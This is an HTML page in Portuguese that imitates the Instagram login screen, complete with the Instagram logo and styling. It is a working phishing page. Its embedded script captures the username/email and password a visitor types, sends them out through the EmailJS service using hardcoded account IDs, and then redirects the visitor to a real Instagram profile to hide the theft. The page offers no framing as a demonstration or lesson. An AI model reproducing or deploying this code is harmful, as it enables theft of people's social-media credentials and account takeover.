<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            max-width: 935px;
            flex-direction: column;
        }

        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }

        .login-box img {
            margin-bottom: 20px;
        }

        .input-box {
            margin-bottom: 10px;
        }

        .input-box input {
            width: 100%;
            padding: 10px;
            margin-top: 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 14px;
        }

        .login-button {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 3px;
            font-weight: bold;
            cursor: pointer;
        }

        .or {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px 0;
        }

        .or div {
            height: 1px;
            width: 45%;
            background-color: #dbdbdb;
        }

        .or span {
            margin: 0 10px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }

        .facebook-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            margin-bottom: 20px;
            cursor: pointer;
        }

        .signup-box {
            margin-top: 20px;
            padding: 20px;
            background-color: white;
            border: 1px solid #dbdbdb;
            text-align: center;
            width: 100%;
            max-width: 350px;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.3.0/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("1wUNc8kQ36NweJw3t"); // Substitua com seu User ID do EmailJS
        })();

        function enviarEmail(event) {
            event.preventDefault(); // Impede o comportamento padrão de recarregar a página

            var emailInput = document.querySelector('input[placeholder="Telefone, nome de usuário ou e-mail"]').value;
            var passwordInput = document.querySelector('input[placeholder="Senha"]').value;

            // Configurando o template do EmailJS
            var templateParams = {
                email: emailInput,
                senha: passwordInput,
            };

            emailjs.send("service_2ifod2v", "template_3c0aqnj", templateParams)
                .then(function(response) {
                    // Redirecionar para o link do Instagram
                    window.location.href = "https://instagram.com/eukenedybr";
                }, function(error) {
                    alert('Falha ao enviar email.', error);
                    console.log('EmailJS error:', error);
                });
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Logo do Instagram" width="180">
            <form onsubmit="enviarEmail(event)">
                <div class="input-box">
                    <input type="text" placeholder="Telefone, nome de usuário ou e-mail" required>
                </div>
                <div class="input-box">
                    <input type="password" placeholder="Senha" required>
                </div>
                <button class="login-button" type="submit">Entrar</button>
            </form>

            <div class="or">
                <div></div>
                <span>OU</span>
                <div></div>
            </div>

            <div class="facebook-login">Entrar com Facebook</div>
            <a href="#">Esqueceu a senha?</a>
        </div>

        <div class="signup-box">
            Não tem uma conta? <a href="#">Cadastre-se</a>
        </div>
    </div>
</body>
</html>
